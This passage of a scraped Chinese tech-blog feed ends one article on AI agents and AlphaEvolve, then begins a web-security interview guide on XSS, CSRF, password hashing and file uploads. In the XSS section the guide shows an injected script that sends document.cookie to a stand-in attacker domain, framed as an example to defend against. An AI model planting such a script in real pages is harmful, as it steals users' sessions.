<p>当智能体表现异常时，开发者需要回答“为什么”。</p>
<p>• <strong>追踪 (Traces)：</strong> AgentOps 利用 OpenTelemetry 标准记录智能体的**“思维轨迹（Trajectory）”**。</p>
<p>• <strong>全过程透明化：</strong> 通过 Trace，你可以看到发送给模型的精确提示词、模型内部的推理过程、它选择调用的工具、生成的参数以及观察到的原始返回数据。这让调试不再是开“黑盒”，而是像查看代码运行日志一样清晰。</p>
</li>
<li>
<ol start="4">
<li>闭环的人类反馈 (Human Feedback)</li>
</ol>
<p>AgentOps 将人类反馈视为最宝贵的资源，而非干扰。</p>
<p>• <strong>疫苗效应：</strong> 当用户点击“踩”或提交错误报告时，AgentOps 流程会捕获这个真实的边缘案例，将其转化为评估数据集中的一个<strong>永久测试用例</strong>。这样做不仅修复了当前的错误，还“接种了疫苗”，确保系统以后再也不会犯同类错误。</p>
</li>
<li>
<ol start="5">
<li>持续进化的操作框架</li>
</ol>
<p>智能体的开发更像是在“导演”一场戏，而不是“搬砖”盖房。</p>
<p>• <strong>模型路由与升级：</strong> AgentOps 建立了一套灵活的框架，可以根据任务复杂度自动路由到不同的模型（如复杂的任务给 Pro，简单的给 Flash），并能在新模型出现时快速进行评测和无缝替换，而无需重构整个系统架构。</p>
<p>• <strong>环境治理：</strong> 在企业级应用中，AgentOps 还负责管理智能体的身份（Agent Identity）、权限控制以及防止“智能体乱象（Agent Sprawl）”的中心化治理。</p>
</li>
<li>
<ol start="6">
<li>
<p>AgentOps小结</p>
<p><strong>为了让你更直观地理解 AgentOps，可以参考这个比喻：<strong>如果开发</strong>传统软件</strong>像是在<strong>编写一个计算器</strong>，你只需要通过点击按钮测试 <code>1+1</code> 是否等于 <code>2</code>；那么 <strong>AgentOps</strong> 就像是在<strong>执教一支足球队</strong>。你无法精准预判球员在场上的每一个动作，但你可以通过制定战术手册（提示词工程）、提供专业装备（工具集成）、录像回放分析（Trace 追踪）以及根据比赛结果调整训练计划（反馈闭环），来确保球队最终能赢得比赛。</p>
</li>
</ol>
</li>
</ul>
<h2 data-id="heading-10">六、 L4 有多强？前沿案例：算法进化论</h2>
<h3 data-id="heading-11"><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeepmind.google%2Fblog%2Falphaevolve-a-gemini-powered-coding-agent-for-designing-advanced-algorithms%2F" target="_blank" title="https://deepmind.google/blog/alphaevolve-a-gemini-powered-coding-agent-for-designing-advanced-algorithms/" ref="nofollow noopener noreferrer">AlphaEvolve (算法进化 Agent)</a></h3>
<p>新版本补充了其 <strong>“双脑协作”机制</strong>（Gemini Flash + Pro）、<strong>“数字达尔文”进化逻辑</strong>以及具体的<strong>量化成就</strong>（如打破 56 年数学记录、节省 0.7% 全球算力等），使其更能体现 L4 级 Agent 的“自我进化”与“科学发现”能力。</p>
<p>这是 L4 级“自我进化”能力的巅峰体现。AlphaEvolve 不仅仅是写代码，它是在进行<strong>自主科学发现（Agentic Discovery）</strong>。它将大模型的创造力与进化算法的筛选机制相结合，解决连人类专家都束手无策的算法难题。</p>
<ul>
<li><strong>核心机制：双脑驱动的“数字达尔文主义”</strong> AlphaEvolve 的工作方式模仿了生物进化论，由两款不同特性的 Gemini 模型协同驱动：
<ul>
<li><strong>发散（Variation）：</strong> 使用速度极快的 <strong>Gemini Flash</strong> 作为“变异引擎”，快速生成大量代码变体，探索广泛的可能性空间。</li>
<li><strong>深思（Refinement）：</strong> 使用推理能力更强的 <strong>Gemini Pro</strong> 作为“优化引擎”，对有潜力的方案进行深度修改和逻辑完善。</li>
<li><strong>自然选择（Selection）：</strong> 所有生成的算法都会被投入一个严苛的自动化评估环境（Evaluator），只有表现超越上一代的代码才能“存活”下来，成为下一代进化的父本。</li>
</ul>
</li>
<li><strong>震撼业界的成就：</strong>
<ul>
<li><strong>打破 56 年数学记录：</strong> 在矩阵乘法领域，它自主发现了一种针对 4x4 矩阵的新算法，仅需 48 次乘法运算（此前人类保持了 56 年的记录是 49 次），直接改写了基础数学教科书。</li>
<li><strong>优化全球基础设施：</strong> 它重写了 Google 数据中心（Borg）的任务调度算法。这个由 AI 发明的简短启发式算法，为 Google <strong>节省了 0.7% 的全球计算资源</strong>——在大规模算力时代，这笔节省是天文数字。</li>
<li><strong>反哺 AI 自身：</strong> 它甚至优化了 TPU 芯片的底层 Verilog 电路设计，并将 Transformer 模型中的 FlashAttention 内核速度提升了 <strong>32.5%</strong>，从而让下一代 AI 的训练速度更快。</li>
</ul>
</li>
</ul>
<p><strong>本质区别：</strong> 传统的 Copilot 是帮你写出<strong>已知</strong>的算法，而 AlphaEvolve 是帮你发现<strong>未知</strong>的算法。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/467042423c1f42e5a972d7a745e24260~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aWH6Iie57K-6YCJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769515740&amp;x-signature=PYyHXsYKfVNsgwKel1o0kk74LbQ%3D" alt="unnamed" loading="lazy"/></p>
<p><strong>AlphaEvolve 进化15 次突变</strong></p>
<p>AlphaEvolve 为发现更快矩阵乘法算法提出的变更列表。在本例中，AlphaEvolve 提出了对多个组件进行大规模变更，包括优化器和权重初始化、损失函数以及超参数扫描。这些变化非常不简单，进化过程中需要 15 次突变。</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9fadc6c28b01401aaaf4efe6e0f8e200~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aWH6Iie57K-6YCJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769515740&amp;x-signature=gEzFxG%2FyUAAKISahAjCFCv5in3I%3D" alt="image-20260105175145749" loading="lazy"/>
<h2 data-id="heading-12">七、 总结：你的新队员已就位</h2>
<p>Agent不再只是软件，它们正在成为我们团队中**“灵活、博学且不知疲倦的新成员”**。</p>
<p>通过 Google 的这套分级体系，我们可以清晰地看到 AI 是如何一步步从“书呆子”变成“全能管家”的。未来的成功不在于你写了多长的 Prompt，而在于你如何构建这一套严谨的架构。</p>
<p><strong>最后送大家一个比喻：</strong> 如果传统的软件是一个<strong>必须按轨道行驶的火车</strong>，那么智能体就像是<strong>一辆配备了顶级导航员的自动驾驶赛车</strong>。你只需要告诉它终点在哪里（使命），它会自己观察天气（扫描环境）、规划最佳路线（深度思考）、控制油门转向（采取行动），并在遇到封路或意外时，灵活地绕行或调整方案（观察迭代），直到把你安全送到目的地。</p>
<h2 data-id="heading-13">引用</h2>
<ol>
<li>Julia Wiesinger, Patrick Marlow, et al. 2024 “Agents”.</li>
</ol>
<p>Available at: <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.kaggle.com%2Fwhitepaper-agents" target="_blank" title="https://www.kaggle.com/whitepaper-agents" ref="nofollow noopener noreferrer">www.kaggle.com/whitepaper-…</a>.</p>
<ol start="2">
<li>Antonio Gulli, Lavi Nigam, et al. 2025 “Agents Companion”.</li>
</ol>
<p>Available at: <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.kaggle.com%2Fwhitepaper-agent-companion" target="_blank" title="https://www.kaggle.com/whitepaper-agent-companion" ref="nofollow noopener noreferrer">www.kaggle.com/whitepaper-…</a>.</p>
<ol start="3">
<li>Shunyu Yao, Y. et al., 2022, 'ReAct: Synergizing Reasoning and Acting in Language Models'.</li>
</ol>
<p>Available at: <a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2210.03629" target="_blank" title="https://arxiv.org/abs/2210.03629" ref="nofollow noopener noreferrer">arxiv.org/abs/2210.03…</a>.</p>
<ol start="4">
<li>Wei, J., Wang, X. et al., 2023, 'Chain-of-Thought Prompting Elicits Reasoning in Large Language Models'.</li>
</ol>
<p>Available at: <a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fpdf%2F2201.11903.pdf" target="_blank" title="https://arxiv.org/pdf/2201.11903.pdf" ref="nofollow noopener noreferrer">arxiv.org/pdf/2201.11…</a>.</p>
<ol start="5">
<li>Shunyu Yao, Y. et al., 2022, 'ReAct: Synergizing Reasoning and Acting in Language Models'.</li>
</ol>
<p>Available at: <a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2210.03629" target="_blank" title="https://arxiv.org/abs/2210.03629" ref="nofollow noopener noreferrer">arxiv.org/abs/2210.03…</a>.</p>
<ol start="6">
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.amazon.com%2FAgentic-Design-Patterns-Hands-Intelligent%2Fdp%2F3032014018" target="_blank" title="https://www.amazon.com/Agentic-Design-Patterns-Hands-Intelligent/dp/3032014018" ref="nofollow noopener noreferrer">www.amazon.com/Agentic-Des…</a></p>
</li>
<li>
<p>Shunyu Yao, et. al., 2024, ‘τ-bench: A Benchmark for Tool-Agent-User Interaction in Real-World Domains’,</p>
</li>
</ol>
<p>Available at: <a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2406.12045" target="_blank" title="https://arxiv.org/abs/2406.12045" ref="nofollow noopener noreferrer">arxiv.org/abs/2406.12…</a>.</p>
<ol start="8">
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fartificialanalysis.ai%2Fguide" target="_blank" title="https://artificialanalysis.ai/guide" ref="nofollow noopener noreferrer">artificialanalysis.ai/guide</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.google.com%2Fvertex-ai%2Fgenerative-ai%2Fdocs%2Fmodel-reference%2Fvertex-ai-model-optimizer" target="_blank" title="https://cloud.google.com/vertex-ai/generative-ai/docs/model-reference/vertex-ai-model-optimizer" ref="nofollow noopener noreferrer">cloud.google.com/vertex-ai/g…</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgemini.google%2Foverview%2Fgemini-live%2F" target="_blank" title="https://gemini.google/overview/gemini-live/" ref="nofollow noopener noreferrer">gemini.google/overview/ge…</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.google.com%2Fvision%3Fe%3D48754805%26hl%3Den" target="_blank" title="https://cloud.google.com/vision?e=48754805&amp;hl=en" ref="nofollow noopener noreferrer">cloud.google.com/vision?e=48…</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.google.com%2Fspeech-to-text%3Fe%3D48754805%26hl%3Den" target="_blank" title="https://cloud.google.com/speech-to-text?e=48754805&amp;hl=en" ref="nofollow noopener noreferrer">cloud.google.com/speech-to-t…</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmedium.com%2Fgoogle-cloud%2Fgenaiops-operationalize-generative-ai-apractical-guide-d5bedaa59d78" target="_blank" title="https://medium.com/google-cloud/genaiops-operationalize-generative-ai-apractical-guide-d5bedaa59d78" ref="nofollow noopener noreferrer">medium.com/google-clou…</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.google.com%2Fvertex-ai%2Fgenerative-ai%2Fdocs%2Fagent-engine%2Fcode-execution%2Foverview" target="_blank" title="https://cloud.google.com/vertex-ai/generative-ai/docs/agent-engine/code-execution/overview" ref="nofollow noopener noreferrer">cloud.google.com/vertex-ai/g…</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fai.google.dev%2Fgemini-api%2Fdocs%2Ffunction-calling" target="_blank" title="https://ai.google.dev/gemini-api/docs/function-calling" ref="nofollow noopener noreferrer">ai.google.dev/gemini-api/…</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmodelcontextprotocol%2F" target="_blank" title="https://github.com/modelcontextprotocol/" ref="nofollow noopener noreferrer">github.com/modelcontex…</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fai.google.dev%2Fgemini-api%2Fdocs%2Fgoogle-search" target="_blank" title="https://ai.google.dev/gemini-api/docs/google-search" ref="nofollow noopener noreferrer">ai.google.dev/gemini-api/…</a></p>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[面试官问网络安全，别再说"密码要设复杂点"了]]></title>    <link>https://juejin.cn/post/7597270795212013608</link>    <guid>https://juejin.cn/post/7597270795212013608</guid>    <pubDate>2026-01-20T12:13:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597270795212013608" data-draft-id="7587277503946850304" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="面试官问网络安全，别再说&quot;密码要设复杂点&quot;了"/> <meta itemprop="keywords" content="后端,前端"/> <meta itemprop="datePublished" content="2026-01-20T12:13:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员大华"/> <meta itemprop="url" content="https://juejin.cn/user/3507878440995946"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            面试官问网络安全，别再说"密码要设复杂点"了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3507878440995946/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员大华
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T12:13:07.000Z" title="Tue Jan 20 2026 12:13:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>有时候面试官可能会问网络安全的问题，他们不是想听你背定义，而是想知道：<strong>你写代码时，会不会多想这么一步</strong>。</p>
<p>我们来看下下面4个问题，或许可以让我们在面试时更加有底气。</p>
<h3 data-id="heading-0">1. XSS攻击：用户输入的内容，真的安全吗？</h3>
<p><strong>案例</strong>：小张做了一个评论功能，用户可以自由发表评论。他直接把用户输入的内容显示在网页上。结果某天，首页被挂上了赌博广告，网站被百度降权...</p>
<p><strong>发生了什么</strong>？<br/>
黑客在评论里输入了这样的内容：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-comment">// 窃取用户cookie</span>
  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://黑客服务器.com/steal?cookie='</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>当其他用户看到这条评论时，这段代码自动执行，用户的登录信息就被偷走了！</p>
<p><strong>怎么防</strong>？<br/>
永远不要相信用户输入，对用户输入的内容，要做消毒处理：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 前端简单消毒函数</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">sanitizeInput</span>(<span class="hljs-params">userInput</span>) {
  <span class="hljs-comment">// 创建一个临时div</span>
  <span class="hljs-keyword">const</span> tempDiv = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
  <span class="hljs-comment">// 把用户输入设为文本（不是HTML）</span>
  tempDiv.<span class="hljs-property">textContent</span> = userInput;
  <span class="hljs-comment">// 获取安全的HTML</span>
  <span class="hljs-keyword">return</span> tempDiv.<span class="hljs-property">innerHTML</span>;
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">const</span> comment = <span class="hljs-string">"&lt;script&gt;alert('hack')&lt;/script&gt;"</span>;
<span class="hljs-keyword">const</span> safeComment = <span class="hljs-title function_">sanitizeInput</span>(comment);
<span class="hljs-comment">// safeComment 变成 "&amp;lt;script&amp;gt;alert('hack')&amp;lt;/script&amp;gt;"</span>
<span class="hljs-comment">// 浏览器会原样显示，不会执行脚本</span>
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 后端Java消毒（使用开源库）</span>
<span class="hljs-comment">// 先引入依赖：implementation 'org.owasp.encoder:encoder'</span>

<span class="hljs-keyword">import</span> org.owasp.encoder.Encode;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeHtml</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">userInput</span> <span class="hljs-operator">=</span> <span class="hljs-string">"&lt;script&gt;alert('xss')&lt;/script&gt;"</span>;
        <span class="hljs-comment">// 对HTML内容进行编码</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">safeOutput</span> <span class="hljs-operator">=</span> Encode.forHtmlContent(userInput);
        System.out.println(safeOutput);
        <span class="hljs-comment">// 输出：&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;)&amp;lt;/script&amp;gt;</span>
    }
}
</code></pre>
<p><strong>面试小技巧</strong>：不要只说要过滤输入，而是说："我会对用户输入进行验证，对输出内容根据上下文进行编码，前后端双重防护。"</p>
<h3 data-id="heading-1">2. CSRF攻击</h3>
<p><strong>案例</strong>：小李做了一个银行转账功能，用户登录后可以转账。某天，有用户反映账户里的钱被转走了，但自己没操作过。调查发现，用户在登录状态下点击了一个恶意链接，就被悄悄转账了...</p>
<p><strong>发生了什么</strong>？<br/>
当你登录一个网站，浏览器会保存一个身份证明（Cookie）。黑客利用这一点，诱导你点击一个链接，这个链接会自动向银行网站发送转账请求。因为你的浏览器带着Cookie，银行以为是你自己操作的！</p>
<p><strong>怎么防</strong>？<br/>
最常用的方法是验证码（CSRF Token）：每个表单都有一个随机生成的验证码，服务器会验证这个码是否有效。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 表单中加入一个隐藏的token --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"/transfer"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"post"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"csrf_token"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"随机字符串如a1b2c3d4e5"</span>&gt;</span>
  金额：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"amount"</span>&gt;</span>
  账号：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"to_account"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span>转账<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 后端验证token</span>
<span class="hljs-meta">@PostMapping("/transfer")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">transferMoney</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String amount, 
                           <span class="hljs-meta">@RequestParam</span> String to_account,
                           <span class="hljs-meta">@RequestParam</span> String csrf_token,
                           HttpSession session)</span> {
    
    <span class="hljs-comment">// 从session获取正确的token</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">validToken</span> <span class="hljs-operator">=</span> (String) session.getAttribute(<span class="hljs-string">"csrf_token"</span>);
    
    <span class="hljs-comment">// 验证token</span>
    <span class="hljs-keyword">if</span> (!csrf_token.equals(validToken)) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"无效请求"</span>);
    }
    
    <span class="hljs-comment">// 执行转账</span>
    bankService.transfer(amount, to_account);
    <span class="hljs-keyword">return</span> <span class="hljs-string">"转账成功"</span>;
}
</code></pre>
<p><strong>解释</strong>：就像银行柜台转账，不仅要看身份证（登录状态），还要核对预留手机号收到的验证码（CSRF Token），要双重确认是否是本人操作。</p>
<h3 data-id="heading-2">3. 密码安全</h3>
<p><strong>案例</strong>：某网站用户数据泄露，100万用户的密码被公开。调查发现，网站把密码直接存到数据库，没有做任何处理。更可怕的是，很多用户在多个网站用同一个密码...</p>
<p><strong>常见的密码错误</strong>：</p>
<ul>
<li>密码明文存储（直接存原始密码）</li>
<li>只做简单MD5加密（很容易破解）</li>
<li>不限制登录尝试次数（允许暴力破解）</li>
</ul>
<p><strong>正确做法</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 安全的密码存储（使用BCrypt）</span>
<span class="hljs-keyword">import</span> org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PasswordSecurity</span> {
    
    <span class="hljs-comment">// 创建加密器</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">BCryptPasswordEncoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>(<span class="hljs-number">12</span>);
    
    <span class="hljs-comment">// 用户注册时：加密存储</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">registerUser</span><span class="hljs-params">(String username, String rawPassword)</span> {
        <span class="hljs-comment">// 加密密码</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">encodedPassword</span> <span class="hljs-operator">=</span> encoder.encode(rawPassword);
        <span class="hljs-comment">// 保存到数据库</span>
        userDao.save(username, encodedPassword);
        <span class="hljs-keyword">return</span> <span class="hljs-string">"注册成功"</span>;
    }
    
    <span class="hljs-comment">// 用户登录时：验证密码</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">loginUser</span><span class="hljs-params">(String username, String rawPassword)</span> {
        <span class="hljs-comment">// 从数据库获取加密后的密码</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">encodedPassword</span> <span class="hljs-operator">=</span> userDao.getPassword(username);
        <span class="hljs-comment">// 验证密码是否匹配</span>
        <span class="hljs-keyword">return</span> encoder.matches(rawPassword, encodedPassword);
    }
}
</code></pre>
<p><strong>为什么BCrypt更安全</strong>？</p>
<ol>
<li><strong>加盐</strong>：每个人的密码都加了不同的随机字符串，防止彩虹表攻击</li>
<li><strong>慢加密</strong>：故意设计得很慢，让黑客难以暴力破解</li>
<li><strong>自适应</strong>：随着计算机变快，可以调整难度</li>
</ol>
<p><strong>额外建议</strong>：</p>
<ul>
<li>重要操作（如修改密码、大额转账）要求二次验证（短信/邮箱）</li>
<li>登录失败5次后锁定账户一段时间</li>
<li>定期提醒用户修改密码</li>
</ul>
<h3 data-id="heading-3">4. 文件上传</h3>
<p><strong>小故事</strong>：某论坛允许用户上传头像，结果有黑客上传了一个图片，实际是个控制服务器的程序。几天后，整个服务器被用来挖矿，网站瘫痪...</p>
<p><strong>风险在哪</strong>？</p>
<ul>
<li>上传的图片可能是木马程序</li>
<li>文件名可能包含"../"跳到其他目录</li>
<li>超大文件可能导致服务器崩溃</li>
</ul>
<p><strong>安全上传四步法</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@PostMapping("/upload-avatar")</span>
